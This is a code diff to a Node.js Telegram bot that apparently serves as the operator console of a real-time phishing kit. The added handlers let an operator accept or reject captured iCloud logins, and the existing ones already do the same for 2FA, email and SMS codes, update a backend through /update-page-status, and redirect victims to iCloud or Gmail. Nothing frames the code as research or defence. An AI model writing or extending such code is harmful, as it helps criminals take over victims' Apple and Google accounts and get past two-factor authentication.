@@ -31,7 +31,7 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, email] = query.data.split("|");
 
-    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : "REJECT"}`);
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "PAGE ACCEPT" : action === "page_reject" ? "PAGE REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : "REJECT"}`);
 
     const response = await fetch(`${APP_URL}/update-status`, {
       method: "POST",
@@ -41,6 +41,15 @@ bot.on("callback_query", async (query) => {
         status: action
       })
     });
+
+    // Also handle iCloud page status updates
+    if (action.includes("page_")) {
+      await fetch(`${APP_URL}/update-page-status`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, status: action })
+      });
+    }
 
     // Also handle SMS status updates
     if (action.includes("sms_")) {
@@ -81,6 +90,10 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page2") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+      } else if (action === "page_accept") {
+        statusMessage = `☁️ <code>${email}</code> iCloud Login <b>ACCEPTED</b>! ✅`;
+      } else if (action === "page_reject") {
+        statusMessage = `☁️ <code>${email}</code> iCloud Login <b>REJECTED</b>! ❌`;
       } else if (action === "sms_accept") {
         statusMessage = `📱 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
       } else if (action === "sms_reject") {
@@ -124,3 +137,17 @@ bot.on("callback_query", async (query) => {
 console.log(`✅ Bot ready`);
 
 module.exports = { bot };
+
+// ============================================================================
+// ICLOUD CALLBACK HANDLERS
+// ============================================================================
+
+// Note: Add this inside the bot.on("callback_query") handler
+// When processing callbacks, add these patterns:
+// - page_accept|${email} → set pendingPage[email].status = "accepted"
+// - page_reject|${email} → set pendingPage[email].status = "rejected"
+// - sms_accept|${code} → set pendingCodes[code].status = "accepted"
+// - sms_reject|${code} → set pendingCodes[code].status = "rejected"
+
+// The callback handler should already be processing these patterns
+// Just ensure it hits the right endpoints for iCloud
